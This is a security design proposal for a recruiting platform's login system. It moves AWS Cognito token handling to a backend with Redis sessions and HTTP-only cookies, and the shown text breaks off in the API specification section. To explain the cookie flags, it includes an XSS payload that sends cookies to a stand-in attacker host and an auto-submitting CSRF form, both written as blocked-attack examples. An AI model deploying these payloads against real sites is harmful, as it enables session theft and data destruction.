# hirewing-doc

# Proposed Secure Authentication Flow
## Modern, Backend-Driven Authentication Architecture

---

## Executive Summary

**Current Problem:** Authentication logic is handled in the frontend, exposing AWS Cognito credentials and tokens to the browser. This creates security vulnerabilities and makes the application susceptible to XSS attacks and token theft.

**Proposed Solution:** Move all authentication logic to the backend (Node.js API). Frontend only sends credentials and receives secure HTTP-only cookies. All sensitive tokens remain on the server.

**Key Benefits:**
- ✅ Enhanced security (tokens never exposed to frontend)
- ✅ HTTP-only, Secure, SameSite cookies
- ✅ Server-side session management
- ✅ CORS protection
- ✅ Protection against XSS, CSRF, and token theft
- ✅ Centralized authentication logic
- ✅ Better control over token refresh

---

## Table of Contents
1. [Current Authentication Flow](#1-current-authentication-flow)
2. [Proposed Authentication Flow](#2-proposed-authentication-flow)
3. [Session Management Strategy](#3-session-management-strategy)
4. [Security Implementation](#4-security-implementation)
5. [API Endpoints Design](#5-api-endpoints-design)
6. [Backend Implementation](#6-backend-implementation)
7. [Next Steps](#7-next-steps)
8. [Key Takeaways](#8-key-takeaways)
9. [Migration Strategy](#9-migration-strategy)
10. [FAQ & Justifications](#10-faq--justifications)

---

## 1. Current Authentication Flow

### Step-by-Step Flow (Existing Implementation)

```
┌─────────────────────────────────────────────────────────────┐
│            CURRENT AUTHENTICATION FLOW (FRONTEND)           │
└─────────────────────────────────────────────────────────────┘

STEP 1: USER LOGIN
   │
   ├─ User enters email and password
   ├─ If "Remember Me" checked → Save credentials in cookies (3 days)
   └─ Frontend starts authentication using AWS Cognito SDK

───────────────────────────────────────────────────────────────

STEP 2: AWS COGNITO AUTHENTICATION (Direct from Frontend)
   │
   API Call: AWS Cognito (Frontend SDK)
   ├─ Request: { email, password }
   │
   ├─ Response from AWS:
   │  ├─ accessToken (expires in 1 hour)
   │  ├─ idToken (user identity)
   │  └─ refreshToken (expires in 30 days)
   │
   └─ Action: Store all 3 tokens in localStorage
      ❌ Security Risk: Tokens exposed to JavaScript (XSS vulnerable)

───────────────────────────────────────────────────────────────

STEP 3: GET USER BASIC INFO FROM AWS
   │
   API Call: AWS Cognito getUserAttributes()
   ├─ Request: Uses tokens from Step 2
   │
   ├─ Response:
   │  ├─ firstName
   │  ├─ lastName
   │  ├─ email
   │  └─ userId (AWS Cognito unique ID)
   │
   └─ Action: Store user details in localStorage

───────────────────────────────────────────────────────────────

STEP 4: GET BACKEND BEARER TOKEN
   │
   API Call: POST /mgmt/auth/token/access
   ├─ Request: { userId }
   │
   ├─ Response:
   │  └─ bearer_token
   │
   └─ Action: Store bearer_token in localStorage
      ❌ Security Risk: Another token exposed (4 tokens total now)

───────────────────────────────────────────────────────────────

STEP 5: GET USER & COMPANY DETAILS
   │
   API Call: GET /mgmt/utils/atsuser/{userId}
   ├─ Request: userId in URL
   │
   ├─ Response:
   │  ├─ User: systemRole, permissions (clientStatus, projectStatus)
   │  ├─ Company: customerId, companyName
   │  ├─ Settings: dashboardConfig, teamRoles
   │  └─ Integrations: RingCentral, etc.
   │
   └─ Action: Encrypt and store in localStorage

───────────────────────────────────────────────────────────────

STEP 6: GET THEME SETTINGS
   │
   API Call: GET /mgmt/customers/atsux
   ├─ Request: customerId from Step 5
   │
   ├─ Response:
   │  ├─ Colors: primaryColor, secondaryColor, fontColors
   │  ├─ Typography: fontFamily
   │  ├─ Header: custom header settings
   │  └─ Logo: logo file path
   │
   └─ Action: Apply theme to UI, store in localStorage

───────────────────────────────────────────────────────────────

STEP 7: GET CUSTOM MESSAGES
   │
   API Call: GET /mgmt/customers/atsux/custommessages
   ├─ Request: customerId from Step 5
   │
   ├─ Response:
   │  └─ Login page custom messages
   │
   └─ Action: Store in cookies

───────────────────────────────────────────────────────────────

STEP 8: NAVIGATE TO DASHBOARD
   │
   ├─ Check account status (active/disabled)
   └─ Redirect to /ats/layout/dashboard

   Login Complete! ✅

───────────────────────────────────────────────────────────────

ONGOING: SUBSEQUENT API REQUESTS
   │
   Every API call includes these headers (from localStorage):
   ├─ Authorization: Bearer <bearer_token>
   ├─ CustomerId: userId
   ├─ CountryId: selectedCountryId
   └─ CustomerName: companyName

───────────────────────────────────────────────────────────────

ONGOING: AUTO TOKEN REFRESH (Every ~1 Hour)
   │
   When AWS accessToken expires:
   ├─ Get refreshToken from localStorage
   ├─ Call AWS Cognito to get new tokens
   ├─ Store new tokens in localStorage
   └─ Continue seamlessly (user doesn't notice)

───────────────────────────────────────────────────────────────

LOGOUT: USER SIGNS OUT
   │
   ├─ Call AWS Cognito signOut()
   ├─ Clear all localStorage
   ├─ Clear all sessionStorage
   ├─ Remove cookies
   └─ Redirect to /ats/login
```

### API Endpoints Summary (Current Flow)

**Total API Calls During Login: 5 separate requests**

| Step | API Endpoint | Method | Purpose | Base URL |
|------|-------------|--------|---------|----------|
| 2 | AWS Cognito Authentication | SDK | Authenticate with AWS Cognito | Direct AWS API |
| 5 | `/mgmt/auth/token/access` | POST | Get backend bearer token | REACT_APP_UTILS |
| 6 | `/mgmt/utils/atsuser/{userId}` | GET | Get user + company details | REACT_APP_UTILS |
| 7 | `/mgmt/customers/atsux` | GET | Get theme settings | REACT_APP_USE_MANAGEMENT |
| 8 | `/mgmt/customers/atsux/custommessages` | GET | Get custom messages | REACT_APP_USE_MANAGEMENT |

**Additional API Calls:**
- Logo preview: `POST /mgmt/customers/previewDocument` (if logo exists)
- Token refresh: AWS Cognito SDK (every ~1 hour)

### Security Issues in Current Flow

❌ **Critical Vulnerabilities:**

1. **AWS Cognito Tokens in localStorage** (Step 3)
   - `accessToken`, `idToken`, `refreshToken` all exposed to JavaScript
   - Vulnerable to XSS attacks
   - Can be stolen by malicious scripts injected into the page

2. **Backend Bearer Token in localStorage** (Step 5)
   - Another sensitive token exposed
   - Same XSS vulnerability
   - Total: 4 tokens in localStorage

3. **Direct AWS Cognito Calls from Frontend** (Steps 2, 4, 12)
   - AWS credentials (UserPoolId, ClientId) exposed in frontend code
   - Authentication logic in frontend can be manipulated
   - Token refresh handled in frontend

4. **No HTTP-only Cookies**
   - Only username/password stored in cookies (if "Remember Me" checked)
   - Session tokens not protected

5. **Multiple API Calls**
   - 5 separate network requests on every login
   - Slower user experience
   - More points of failure

6. **No Centralized Session Management**
   - Backend cannot invalidate sessions
   - Cannot track active users
   - Cannot enforce security policies

7. **Token Exposure in DevTools**
   - All tokens visible in browser Application tab
   - Can be copied and used by attackers

8. **CSRF Vulnerability**
   - Tokens sent in Authorization headers
   - Not protected by SameSite cookie policy

### Data Stored in localStorage (Current Flow)

```javascript
// AWS Cognito Tokens (XSS vulnerable)
localStorage.setItem("accessToken", "eyJraWQiOiJ...")
localStorage.setItem("idToken", "eyJraWQiOiJZ...")
localStorage.setItem("refreshToken", "eyJjdHkiOi...")

// Backend Bearer Token (XSS vulnerable)
localStorage.setItem("bearer_token", "backend_token_value")

// User Details (Encrypted)
localStorage.setItem("GetUserInfo", encrypted_user_data)
localStorage.setItem("GetUserId", encrypted_user_id)
localStorage.setItem("GetUserName", encrypted_company_name)
localStorage.setItem("DashboardConfig", encrypted_dashboard_config)
localStorage.setItem("teamRoles", encrypted_team_roles)

// AWS Cognito User Attributes (Plain text)
localStorage.setItem("getAttributes", JSON.stringify([{
  firstName: "John",
  lastName: "Doe",
  email: "john@company.com",
  userId: "cognito_user_id"
}]))

// Theme Settings (Plain text)
localStorage.setItem("themeSettings", JSON.stringify({
  primaryColor: "#FFD800",
  secondaryColor: "#3B4046",
  fontFamily: "Roboto, sans-serif",
  logo: "https://s3.amazonaws.com/..."
}))

// RingCentral Integration (Plain text)
localStorage.setItem("ringCentralIntegration", JSON.stringify({
  attribute_5: "Ring Central",
  // other integration details
}))
```

**Total Items in localStorage: 11+ items**
**Sensitive Items: 4 tokens (accessToken, idToken, refreshToken, bearer_token)**

### Files Involved in Current Authentication

| File | Location | Purpose | Lines of Code |
|------|----------|---------|---------------|
| **Login.jsx** | `src/pages/Landings/LoginForm/Login.jsx` | Login form UI and orchestration | ~600 lines |
| **CognitoSlice.js** | `src/_redux/CognitoSlice.js` | AWS Cognito integration (SDK calls) | ~364 lines |
| **UserManagerSlice.js** | `src/_redux/_services/UserManagerSlice.js` | User management, customer details, theme fetch | ~452+ lines |
| **UserManagerApihelper.js** | `src/_redux/_apiHelpers/UserManagerApihelper.js` | API helper functions | ~77 lines |
| **_apihelper.js** | `src/_redux/_apiHelpers/_apihelper.js` | Axios interceptor, bearer token injection | ~100+ lines |
| **ThemeSlice.js** | `src/_redux/_services/ThemeSlice.js` | Theme configuration management | ~170 lines |
| **AuthSlice.js** | `src/_redux/AuthSlice.js` | Auth state management | ~29 lines |
| **AuthGuard.js** | `src/_utilities/AuthGuard.js` | Route protection (checks accessToken) | ~50+ lines |

**Total: 8 files, ~1800+ lines of frontend authentication code**

---

## 2. Proposed Authentication Flow

### Complete Step-by-Step Flow

```
┌─────────────────────────────────────────────────────────────┐
│               NEW SECURE AUTHENTICATION FLOW                │
└─────────────────────────────────────────────────────────────┘

STEP 1: USER SUBMITS LOGIN
   │
   Frontend (Login Page)
   ├─ User enters: email, password, rememberMe
   ├─ Validates: email format, password not empty
   ├─ POST /api/auth/login
   │  Body: { email, password, rememberMe }
   │  Headers: { Content-Type: application/json }
   │
   └─ NO AWS Cognito calls from frontend

───────────────────────────────────────────────────────────────

STEP 2: BACKEND AUTHENTICATES WITH AWS COGNITO
   │
   Backend (Node.js API)
   │
   ├─ Receives credentials from frontend: { email, password, rememberMe }
   │
   ├─ Validates input (email format, password not empty)
   │
   ├─ Calls AWS Cognito authentication API (server-side)
   │  Using AWS SDK: AdminInitiateAuth or InitiateAuth
   │
   ├─ AWS Cognito validates username and password
   │
   └─ If successful, AWS returns:
      ├─ Access Token (expires in 1 hour)
      ├─ ID Token (contains user identity)
      ├─ Refresh Token (expires in 30 days)
      └─ User attributes (first name, last name, email, userId)

───────────────────────────────────────────────────────────────

STEP 3: EXTRACT USER DETAILS FROM AWS TOKENS
   │
   Backend continues...
   │
   ├─ Decode ID Token (JWT) to extract:
   │  ├─ userId (unique AWS Cognito ID)
   │  ├─ email
   │  ├─ first name
   │  └─ last name
   │
   └─ Use userId to fetch full user profile from database

───────────────────────────────────────────────────────────────

STEP 4: FETCH USER DETAILS FROM DATABASE
   │
   Backend continues...
   │
   ├─ Query database using userId from AWS Cognito
   │
   ├─ Get complete user profile:
   │  ├─ Customer ID
   │  ├─ System role (Admin, Manager, Standard User, etc.)
   │  ├─ Company name
   │  ├─ Permissions (client access, project access)
   │  ├─ Account status (active/disabled)
   │  └─ Dashboard configuration
   │
   └─ Validate account is active
      ├─ If disabled → Return error: "Account disabled"
      └─ If active → Continue to next step

───────────────────────────────────────────────────────────────

STEP 5: CREATE SERVER SESSION
   │
   Backend continues...
   │
   ├─ Generate unique session ID
   │
   ├─ Store session in Redis (or database):
   │  ├─ Session ID
   │  ├─ User ID
   │  ├─ AWS Cognito tokens (access, ID, refresh)
   │  ├─ User details (name, role, permissions)
   │  ├─ Session expiration time
   │  │  → 30 days if "Remember Me" checked
   │  │  → 24 hours if not checked
   │  └─ Last activity timestamp
   │
   └─ All sensitive tokens stored ONLY on server
      → Frontend never receives AWS tokens

───────────────────────────────────────────────────────────────

STEP 6: SET SECURE HTTP-ONLY COOKIE
   │
   Backend continues...
   │
   ├─ Create secure cookie with session ID
   │
   ├─ Cookie security flags:
   │  ├─ httpOnly: true → JavaScript cannot access it (XSS protection)
   │  ├─ secure: true → Only sent over HTTPS
   │  ├─ sameSite: 'strict' → CSRF attack protection
   │  ├─ maxAge: 30 days or 24 hours (based on "Remember Me")
   │  └─ domain: '.hirewing.ca' → Your domain only
   │
   └─ Cookie automatically included in all future requests
      → Frontend doesn't need to manually add it

───────────────────────────────────────────────────────────────

STEP 7: RETURN USER DETAILS TO FRONTEND
   │
   Backend responds:
   │
   ├─ HTTP Response:
   │  ├─ Status: 200 OK
   │  ├─ Set-Cookie header (contains session ID)
   │  └─ Response body: User profile data
   │
   ├─ User data sent to frontend:
   │  ├─ Customer ID
   │  ├─ Name (first, last)
   │  ├─ Email
   │  ├─ System role
   │  ├─ Company name
   │  ├─ Permissions (client access, project access)
   │  └─ Dashboard configuration
   │
   └─ ⚠️ IMPORTANT: NO AWS TOKENS sent to frontend
      → All tokens remain secure on backend

───────────────────────────────────────────────────────────────

STEP 8: FRONTEND STORES USER DETAILS
   │
   Frontend receives response:
   │
   ├─ Browser automatically stores the cookie
   │  → Cookie is HTTP-only (JavaScript cannot read it)
   │
   ├─ Frontend stores user profile in localStorage:
   │  ├─ User name, email, role
   │  ├─ Company information
   │  ├─ Permissions
   │  └─ Dashboard preferences
   │
   ├─ No encryption needed (non-sensitive data only)
   │
   └─ Redirect to dashboard: /ats/layout/dashboard

───────────────────────────────────────────────────────────────

STEP 9: SUBSEQUENT API REQUESTS
   │
   User navigates to Applicants page
   │
   ├─ Frontend makes API call: GET /api/applicants
   │
   ├─ Browser AUTOMATICALLY includes session cookie
   │  → No manual Authorization header needed
   │  → Cookie sent with every request to same domain
   │
   └─ Backend receives request with cookie attached

───────────────────────────────────────────────────────────────

STEP 10: BACKEND VALIDATES SESSION
   │
   Backend middleware (runs on EVERY API request):
   │
   ├─ Extract session ID from cookie
   │
   ├─ Look up session in Redis/Database
   │
   ├─ Validate session:
   │  ├─ Does session exist?
   │  ├─ Is session expired?
   │  ├─ Is user account still active?
   │  └─ Are AWS tokens still valid?
   │
   ├─ If validation fails → Return 401 Unauthorized
   │
   ├─ If validation succeeds:
   │  ├─ Update last activity timestamp
   │  ├─ Attach user details to request
   │  └─ Continue processing request

───────────────────────────────────────────────────────────────

STEP 11: PROCESS REQUEST & RETURN DATA
   │
   Backend continues:
   │
   ├─ User is authenticated ✓
   │
   ├─ Check user permissions for requested resource
   │
   ├─ Fetch requested data (applicants, jobs, etc.)
   │
   ├─ Filter data based on:
   │  ├─ Customer ID (user's company)
   │  ├─ Country ID (selected country)
   │  └─ User role and permissions
   │
   └─ Return filtered data to frontend

───────────────────────────────────────────────────────────────

STEP 12: AUTOMATIC TOKEN REFRESH
   │
   Backend handles token refresh automatically:
   │
   ├─ Check if AWS access token expired (expires every 1 hour)
   │
   ├─ If expired:
   │  ├─ Get refresh token from session
   │  ├─ Call AWS Cognito to get new tokens
   │  ├─ Update session with new access token and ID token
   │  └─ Continue processing request normally
   │
   └─ Frontend is completely unaware
      → Token refresh happens transparently
      → User never interrupted
      → No logout required

───────────────────────────────────────────────────────────────

STEP 13: LOGOUT
   │
   User clicks "Sign Out"
   │
   Frontend:
   ├─ Calls: POST /api/auth/logout
   │
   Backend:
   ├─ Extract session ID from cookie
   ├─ Delete session from Redis/Database
   ├─ Clear the session cookie
   ├─ Optional: Sign out from AWS Cognito globally
   └─ Return: 200 OK
   │
   Frontend:
   ├─ Clear user details from localStorage
   ├─ Browser automatically removes cookie
   └─ Redirect to: /ats/login
   │
   Result: Clean logout, all session data destroyed
```

---

## 3. Session Management Strategy

### Recommended Approach: Session ID + Redis

**Why This Approach?**
- Most secure
- Easy to invalidate sessions
- Fast lookup with Redis
- Can track active sessions
- Admin can force logout users

### Session Storage Structure

```javascript
// Redis Key: session:{sessionId}
{
  sessionId: "a1b2c3d4e5f6...",
  userId: 123456,
  cognitoUserId: "cognito-sub-id",

  // AWS Cognito tokens (never sent to frontend)
  accessToken: "eyJhbGci...",
  idToken: "eyJhbGci...",
  refreshToken: "eyJjdHk...",

  // User details (for quick access)
  userDetails: {
    firstName: "John",
    lastName: "Doe",
    email: "john@company.com",
    systemRole: "Admin",
    companyName: "TechCorp Inc",
    customerId: 123456,
    clientStatus: 1,
    projectStatus: 1
  },

  // Session metadata
  createdAt: "2025-11-08T10:00:00Z",
  expiresAt: "2025-12-08T10:00:00Z", // 30 days if rememberMe
  lastActivity: "2025-11-08T14:30:00Z",
  ipAddress: "192.168.1.1",
  userAgent: "Mozilla/5.0..."
}

// TTL: Auto-delete after expiration
```

### Session Validation Process

**On every API request, backend middleware:**
1. Extracts session ID from cookie
2. Looks up session in Redis
3. Validates session is not expired
4. Checks user account is still active
5. Refreshes AWS tokens if needed
6. Updates last activity timestamp
7. Attaches user info to request and continues

**If validation fails:** Returns 401 Unauthorized and user is logged out

---

## 4. Security Implementation

### A. HTTP-only Secure Cookies

```javascript
// Backend: Setting cookie on login
res.cookie('session', sessionId, {
  httpOnly: true,        // Cannot be accessed by JavaScript (XSS protection)
  secure: true,          // Only sent over HTTPS
  sameSite: 'strict',    // CSRF protection - only same-site requests
  maxAge: rememberMe ? 30*24*60*60*1000 : 24*60*60*1000, // 30 days or 24 hours
  domain: '.hirewing.ca', // Allow all subdomains
  path: '/',             // Available for all routes
  signed: true           // Sign cookie to prevent tampering (optional)
});
```

**Cookie Flags Explained:**

| Flag | What It Does | What This Protects on HireWing Website |
|------|--------------|----------------------------------------|
| **`httpOnly: true`** | Browser hides the cookie from JavaScript. Even your own code cannot read it. | **If someone injects bad code into the website** (like a virus in a job description), that code CANNOT see or steal your login session. You stay logged in safely even if the page is hacked. |
| **`secure: true`** | Cookie only travels through HTTPS (encrypted like a tunnel), never through regular HTTP. | **When you're on public WiFi** (Starbucks, airport), hackers with monitoring tools CANNOT see your session cookie traveling to HireWing. Your login stays invisible to eavesdroppers. |
| **`sameSite: 'strict'`** | Cookie ONLY works when you're actually on hirewing.ca. Other websites cannot use it, even if they try. | **If you click a link on a fake job site** that secretly tries to delete your applicants, your browser says "NO, this cookie only works on real hirewing.ca" and blocks the attack completely. |
| **`maxAge`** | Sets an expiration timer. After that time, the cookie disappears automatically. | **If you DON'T check "Remember Me":** You're auto-logged out after 24 hours (good for shared computers). **If you CHECK "Remember Me":** You stay logged in for 30 days (convenient for your personal laptop). |
| **`domain: '.hirewing.ca'`** | Cookie works on ALL hirewing.ca pages (app.hirewing.ca, admin.hirewing.ca), but NOT on other websites. | **Fake websites like "hirewing-jobs.com" or "hirewing-login.net" CANNOT steal your real session,** even if they look identical. Your cookie only unlocks the real hirewing.ca website. |
| **`path: '/'`** | Cookie is sent to ALL pages on the website: /applicants, /jobs, /dashboard, /settings - everywhere. | You can **click through Applicants → Jobs → Reports → Settings** without logging in again. One session works across the entire website seamlessly. |
| **`signed: true`** (Optional) | Cookie has a secret digital signature. If anyone changes even one letter, the signature breaks and the cookie is rejected. | **If a hacker steals your cookie and tries to edit it** (change "regular user" to "admin" or switch companies), the server detects the tampering instantly and kicks them out. |

**Example Attack Scenarios Blocked:**

1. **XSS Attack Blocked by `httpOnly`:**
   - **Scenario:** Hacker injects malicious code into a job description field
   - **Attack code:** `<script>fetch('https://evil-recruiter.com/steal?cookie=' + document.cookie)</script>`
   - **Without `httpOnly`:** Hacker steals session cookie when HR manager views the job posting → Gains access to all applicants, can delete candidates, steal resume data ❌
   - **With `httpOnly`:** `document.cookie` returns empty → Attack fails, applicant data stays protected ✅

2. **Network Eavesdropping Blocked by `secure`:**
   - **Scenario:** HR manager reviews 50 job applications while working from Starbucks WiFi
   - **Attack:** Hacker at the coffee shop uses network monitoring tools (Wireshark) to intercept traffic
   - **Without `secure`:** Session cookie sent over HTTP → Hacker captures it → Logs into HireWing as the HR manager → Downloads all candidate resumes with personal info (phone numbers, addresses, emails) ❌
   - **With `secure`:** Cookie only sent over HTTPS (encrypted) → Hacker sees gibberish → Cannot access applicant data ✅

3. **CSRF Attack Blocked by `sameSite: 'strict'`:**
   - **Scenario:** Recruiter is logged into HireWing and visits a malicious job board website in another tab
   - **Attack:** Evil site has hidden form: `<form action="https://api.hirewing.ca/applicants/delete-all" method="POST">` that auto-submits
   - **Without `sameSite`:** Browser sends HireWing session cookie with the request → All applicants for the company are deleted → Months of recruitment work lost ❌
   - **With `sameSite: 'strict'`:** Browser refuses to send cookie because request came from different domain → Attack blocked, applicants stay safe ✅

4. **Cookie Tampering Blocked by `signed`:**
   - **Scenario:** Hacker intercepts session cookie: `session=user123_company_ABC`
   - **Attack:** Hacker edits cookie in browser DevTools to: `session=admin999_company_XYZ` trying to gain admin access and switch to competitor's data
   - **Without `signed`:** Server accepts modified cookie → Hacker becomes admin → Can see all companies' applicants, delete job postings, steal candidate data ❌
   - **With `signed`:** Cryptographic signature doesn't match tampered data → Server rejects cookie → Hacker gets 401 Unauthorized ✅

---

### B. CORS Configuration

```javascript
// Backend: CORS setup
const cors = require('cors');

app.use(cors({
  origin: [
    'https://app.hirewing.ca',
    'https://www.hirewing.ca',
    process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
  ].filter(Boolean),
  credentials: true,           // Allow cookies to be sent
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Accept'],
  exposedHeaders: [],
  maxAge: 86400               // Cache preflight for 24 hours
}));

// Middleware to validate Origin header
app.use((req, res, next) => {
  const origin = req.get('origin');
  const allowedOrigins = [
    'https://app.hirewing.ca',
    'https://www.hirewing.ca'
  ];

  // Block requests from Postman, curl, etc. (no Origin header)
  if (!origin && process.env.NODE_ENV === 'production') {
    return res.status(403).json({ error: 'Forbidden - No origin' });
  }

  // Block requests from unauthorized domains
  if (origin && !allowedOrigins.includes(origin) && process.env.NODE_ENV === 'production') {
    return res.status(403).json({ error: 'Forbidden - Invalid origin' });
  }

  next();
});
```

---

## 5. API Endpoints Design

### Overview: Current vs New Authentication Flow

**CURRENT FLOW (Frontend handles AWS Cognito):**
1. Frontend calls AWS Cognito directly with credentials → Gets `accessToken`, `idToken`, `refreshToken`, `userId` (stored in localStorage)
2. Frontend sends `userId` to `/mgmt/auth/token/access` → Gets `bearer_token` (stored in localStorage)
3. Frontend sends `userId` to `/mgmt/utils/atsuser/{userId}` → Gets user details, company info, dashboardConfig, teamRoles, integrations
4. Frontend sends `customerId` to `/mgmt/customers/atsux` → Gets theme settings (colors, fonts, logo)
5. Frontend sends `customerId` to `/mgmt/customers/atsux/custommessages` → Gets custom login messages
6. **Total: 5 separate API calls after login + AWS Cognito authentication**

**NEW FLOW (Backend handles everything):**
1. Frontend sends credentials to `/api/auth/login` → Gets EVERYTHING in one response
2. **Total: 1 API call - all data returned together**

---

### Current Authentication API Routes

**Based on actual frontend codebase analysis:**

| Route | Method | Purpose | Payload | Response | File Reference | Issues |
|-------|--------|---------|---------|----------|----------------|--------|
| **AWS Cognito (Frontend)** | N/A | Authenticate user with Cognito | `{ email, password }` | `{ accessToken, idToken, refreshToken, userId }` | [CognitoSlice.js:20-62](src/_redux/CognitoSlice.js#L20-L62) | ❌ Tokens exposed to frontend localStorage, XSS vulnerable |
| `/mgmt/auth/token/access` | POST | Generate backend bearer token | `{ userId }` | `{ bearer_token }` | [UserManagerSlice.js:446-451](src/_redux/_services/UserManagerSlice.js#L446-L451) | ⚠️ Requires AWS tokens first, another separate API call |
| `/mgmt/utils/atsuser/{userId}` | GET | Get user + company details from DB | Path param: `userId` | `{ firstName, lastName, email, systemRole, clientStatus, project, companyName, dashboardConfig, teamRoles, integrations }` | [UserManagerSlice.js:91-107](src/_redux/_services/UserManagerSlice.js#L91-L107) | ⚠️ 3rd separate call, requires bearer token |
| `/mgmt/customers/atsux` | GET | Get theme settings (colors, fonts, logo) | Query param: `customerId` | `{ primaryColor, secondaryColor, fontFamily, logo, etc. }` | [ThemeSlice.js:52-127](src/_redux/_services/ThemeSlice.js#L52-L127) | ⚠️ 4th separate call after customer details loaded |
| `/mgmt/customers/atsux/custommessages` | GET | Get custom messages for login page | Query param: `customerId` | `{ custommessageData: [...] }` | [Login.jsx:252](src/pages/Landings/LoginForm/Login.jsx#L252) | ⚠️ 5th separate call for custom messages |

**Total API Calls for Login:** 5 separate requests
**Security Issues:**
- ❌ AWS tokens (accessToken, idToken, refreshToken) stored in localStorage - XSS vulnerable
- ❌ Bearer token stored in localStorage - XSS vulnerable
- ❌ No HTTP-only cookies
- ❌ Frontend handles AWS Cognito directly with SDK

**IMPORTANT NOTE:** There is NO `/api/theme` endpoint. Theme settings are fetched via `/mgmt/customers/atsux`.

---

### New Secure Authentication API Routes

| Route | Method | Purpose | Replaces | What's Different |
|-------|--------|---------|----------|------------------|
| `/api/auth/login` | POST | **Complete authentication - returns EVERYTHING** | • AWS Cognito SDK (frontend)<br>• `/mgmt/auth/token/access`<br>• `/mgmt/utils/atsuser/{userId}`<br>• `/mgmt/customers/atsux`<br>• `/mgmt/customers/atsux/custommessages` | ✅ Backend calls AWS Cognito<br>✅ Returns all data in one response<br>✅ Sets HTTP-only cookie<br>✅ NO tokens sent to frontend |
| `/api/auth/logout` | POST | Sign out user + destroy session | Current logout (partial) | ✅ Destroys session in Redis<br>✅ Clears HTTP-only cookie<br>✅ Optionally signs out from AWS Cognito globally |
| `/api/auth/me` | GET | Get current user (for page refresh) | None (new endpoint) | ✅ Validates session cookie<br>✅ Returns user details without re-login<br>✅ No need to re-fetch 5 endpoints |
| `/api/auth/change-password` | POST | Change password via AWS Cognito | Current change password (frontend Cognito) | ✅ Backend handles Cognito tokens<br>✅ Frontend never sees tokens<br>✅ Session-based auth |
| `/api/auth/refresh` | POST | Manually refresh session (optional) | None (new endpoint) | ✅ Extends session expiration<br>✅ Updates session cookie |

**Total API Calls for Login:** 1 request (80% reduction!)
**Security Improvements:** HTTP-only cookies, all AWS tokens on backend, session management with Redis, XSS protection

---

### Detailed Route Specifications

#### **1. POST /api/auth/login**

**Purpose:** Complete authentication - authenticates with AWS Cognito, fetches all user data, creates session, returns everything.

**Current Flow Replaced:**
```javascript
// OLD (5 separate calls):
1. AWS Cognito authentication (frontend) → Get userId
2. POST /api/users/getUserByID → Get user details
3. POST /api/getAccessToken → Get bearer token
4. POST /api/getCustDetails → Get company details
5. GET /api/theme → Get theme settings
```

**New Flow:**
```javascript
// NEW (1 call):
POST /api/auth/login → Returns EVERYTHING
```

**Request Payload:**
```json
{
  "email": "recruiter@company.com",
  "password": "SecurePassword123!",
  "rememberMe": true
}
```

**Success Response (200 OK):**
```json
{
  "success": true,
  "user": {
    // User Identity (from AWS Cognito + Database)
    "userId": "a1b2c3d4-e5f6-7890-abcd-1234567890ab",
    "email": "recruiter@company.com",
    "firstName": "John",
    "lastName": "Doe",

    // User Role & Permissions (from Database)
    "systemRole": "Admin",
    "clientStatus": 1,
    "projectStatus": 1,
    "permissions": {
      "canViewApplicants": true,
      "canCreateJobs": true,
      "canDeleteCandidates": true,
      "canAccessReports": true
    },

    // Company/Customer Details (from Database)
    "customerId": 123,
    "companyName": "TechCorp Inc",
    "country": "Canada",
    "countryId": 1,

    // Theme Settings (from Database)
    "theme": {
      "mode": "dark",
      "primaryColor": "#1976d2",
      "secondaryColor": "#dc004e"
    },

    // Dashboard Configuration (from Database)
    "dashboardConfig": {
      "defaultView": "applicants",
      "itemsPerPage": 25,
      "showWelcomeMessage": true
    }
  }
}
```

**Set-Cookie Header (Automatic):**
```
Set-Cookie: session=abc123def456...;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Max-Age=2592000;
  Domain=.hirewing.ca;
  Path=/
```

**Error Responses:**
```javascript
// 400 Bad Request
{
  "success": false,
  "error": "Invalid email or password"
}

// 403 Forbidden
{
  "success": false,
  "error": "Account disabled. Please contact administrator."
}

// 429 Too Many Requests
{
  "success": false,
  "error": "Too many login attempts. Please try again after 15 minutes."
}

// 500 Internal Server Error
{
  "success": false,
  "error": "Authentication failed. Please try again later."
}
```

**Backend Processing:**
1. ✅ Validate email format and password
2. ✅ Call AWS Cognito `AdminInitiateAuth` with credentials
3. ✅ AWS Cognito returns: accessToken, idToken, refreshToken, userId
4. ✅ Query database: `SELECT * FROM users WHERE cognito_user_id = userId`
5. ✅ Query database: `SELECT * FROM customers WHERE customer_id = user.customerId`
6. ✅ Query database: `SELECT * FROM user_themes WHERE user_id = userId`
7. ✅ Generate unique session ID (UUID)
8. ✅ Store session in Redis with all data + AWS tokens
9. ✅ Set HTTP-only cookie with session ID
10. ✅ Return combined response with ALL user data

**What This Replaces:**
- ❌ Frontend AWS Cognito SDK calls (amazon-cognito-identity-js)
- ❌ `/mgmt/auth/token/access` - backend bearer token generation
- ❌ `/mgmt/utils/atsuser/{userId}` - user and company details fetch
- ❌ `/mgmt/customers/atsux` - theme settings fetch
- ❌ `/mgmt/customers/atsux/custommessages` - custom messages fetch

---

#### **2. POST /api/auth/logout**

**Purpose:** Sign out user, destroy session, clear cookies

**Request Payload:** None (session ID from cookie)

**Request Headers:**
```
Cookie: session=abc123def456...
```

**Success Response (200 OK):**
```json
{
  "success": true,
  "message": "Logged out successfully"
}
```

**Set-Cookie Header:**
```
Set-Cookie: session=; Max-Age=0; (cookie deleted)
```

**Backend Processing:**
1. ✅ Extract session ID from cookie
2. ✅ Delete session from Redis: `DEL session:abc123def456`
3. ✅ Optionally call AWS Cognito `GlobalSignOut` to invalidate AWS tokens
4. ✅ Clear session cookie (set Max-Age=0)
5. ✅ Return success response

**What This Replaces:**
- Old `/api/auth/logout` (now also handles AWS Cognito logout and Redis cleanup)

---

#### **3. GET /api/auth/me**

**Purpose:** Get current user details - used for page refresh to restore session without re-login

**Request Payload:** None (session ID from cookie)

**Request Headers:**
```
Cookie: session=abc123def456...
```

**Success Response (200 OK):**
```json
{
  "success": true,
  "user": {
    "userId": "a1b2c3d4-e5f6-7890-abcd-1234567890ab",
    "email": "recruiter@company.com",
    "firstName": "John",
    "lastName": "Doe",
    "systemRole": "Admin",
    "clientStatus": 1,
    "projectStatus": 1,
    "customerId": 123,
    "companyName": "TechCorp Inc",
    "theme": { ... },
    "dashboardConfig": { ... }
  }
}
```

**Error Responses:**
```javascript
// 401 Unauthorized
{
  "success": false,
  "error": "Not authenticated"
}

// 403 Forbidden
{
  "success": false,
  "error": "Account disabled"
}
```

**Backend Processing:**
1. ✅ Extract session ID from cookie
